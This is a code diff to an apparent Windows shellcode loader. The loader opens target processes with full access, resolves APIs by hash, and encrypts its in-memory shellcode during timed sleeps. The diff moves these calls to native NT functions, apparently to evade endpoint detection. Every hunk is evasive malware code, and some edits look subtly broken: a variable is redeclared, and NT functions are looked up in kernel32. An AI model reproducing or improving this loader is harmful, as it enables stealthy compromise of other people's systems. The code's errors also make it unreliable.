@@ -21,16 +21,20 @@ static inline void resolve_snapshot_apis(void) {
         g_ldr->apis->Process32FirstW = (pProcess32First)GetProc(g_ldr->apis->modules.kernel32, HASHED_PROCESS32FIRSTW);
 }
 
-static inline HANDLE open_process_by_pid(DWORD pid) {
-    HANDLE h = g_ldr->apis->OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    return h;
 
+static inline HANDLE open_process_by_pid(DWORD pid) {
+    HANDLE h = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(oa), 0 };
+    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
+    g_ldr->apis->NtOpenProcess(&h, PROCESS_ALL_ACCESS, &oa, &cid);
+    return h;
 }
 
 static inline HANDLE open_process_by_name(PWCHAR name, PDWORD chosenPid) {
     resolve_snapshot_apis();
 
     HANDLE s = g_ldr->apis->pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (s == INVALID_HANDLE_VALUE) return NULL;
     PROCESSENTRY32W pe;
     pe.dwSize = sizeof(PROCESSENTRY32W);
 
@@ -42,13 +46,13 @@ static inline HANDLE open_process_by_name(PWCHAR name, PDWORD chosenPid) {
                 hProc = open_process_by_pid(pe.th32ProcessID);
                 if (hProc) {
                     *chosenPid = pe.th32ProcessID;
-                    g_ldr->apis->CloseHandle(s);
+                    g_ldr->apis->NtCloseHandle(s);
                     return hProc;
                 }
             }
         } while (g_ldr->apis->Process32NextW(s, &pe));
     }
-    g_ldr->apis->CloseHandle(s);
+    g_ldr->apis->NtCloseHandle(s);
     return hProc;
 }
 
@@ -91,10 +95,10 @@ static inline BOOL ensure_sleep_apis() {
         g_ldr->apis->SetWaitableTimer = (pSetWaitableTimer)GetProc(g_ldr->apis->modules.kernel32, HASHED_SETWAITABLETIMER);
     if (!g_ldr->apis->WaitForSingleObject)
         g_ldr->apis->WaitForSingleObject = (pWaitForSingleObject)GetProc(g_ldr->apis->modules.kernel32, HASHED_WAITFORSINGLEOBJECT);
-    if(!g_ldr->apis->CloseHandle)
-        g_ldr->apis->CloseHandle = (pCloseHandle)GetProc(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);
-    if (!g_ldr->apis->VirtualProtect)
-        g_ldr->apis->VirtualProtect = (pVirtualProtect)GetProc(g_ldr->apis->modules.kernel32, HASHED_VIRTUALPROTECT);
+    if(!g_ldr->apis->NtCloseHandle)
+        g_ldr->apis->NtCloseHandle = (pNtCloseHandle)GetProc(g_ldr->apis->modules.kernel32, HASHED_NTCLOSE);
+    if (!g_ldr->apis->NtProtectVirtualMemory)
+        g_ldr->apis->NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProc(g_ldr->apis->modules.kernel32, HASHED_NTPROTECTVIRTUALMEMORY);
 }
 
 static inline void do_sleep(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) {
@@ -104,7 +108,11 @@ static inline void do_sleep(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) 
     DWORD old;
 #ifdef LOCAL
     DBGA("[*] Encrypting shellcode\n");
-    g_ldr->apis->VirtualProtect(Shellcode, ShellcodeSize, PAGE_READWRITE, &old);
+    PVOID protAddr = Shellcode;
+    SIZE_T protSize = ShellcodeSize;
+    ULONG old;
+    g_ldr->apis->NtProtectVirtualMemory((HANDLE)-1, &protAddr, &protSize, PAGE_READWRITE, &old);
+    
     crypt_ecrypt_decrypt((unsigned char*)Shellcode, ShellcodeSize, g_ldr->config->EncryptionKey,
         sizeof(g_ldr->config->EncryptionKey),
         g_ldr->config->Nonce,
@@ -118,14 +126,16 @@ static inline void do_sleep(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) 
     li.QuadPart = -(LONGLONG)time * 10000000LL;
     g_ldr->apis->SetWaitableTimer(hTimer, &li, 0, NULL, NULL, FALSE);
     g_ldr->apis->WaitForSingleObject(hTimer, INFINITE);
-    g_ldr->apis->CloseHandle(hTimer);
+    g_ldr->apis->NtCloseHandle(hTimer);
 #ifdef LOCAL
     DBGA("[*] Decrypting shellcode\n");
     crypt_ecrypt_decrypt((unsigned char*)Shellcode, ShellcodeSize, g_ldr->config->EncryptionKey,
         sizeof(g_ldr->config->EncryptionKey),
         g_ldr->config->Nonce,
         sizeof(g_ldr->config->Nonce));
-    g_ldr->apis->VirtualProtect(Shellcode, ShellcodeSize, old, &old);
+    protAddr = Shellcode;
+    protSize = ShellcodeSize;
+    g_ldr->apis->NtProtectVirtualMemory((HANDLE)-1, &protAddr, &protSize, old, &old);
 #endif
     return;
 }
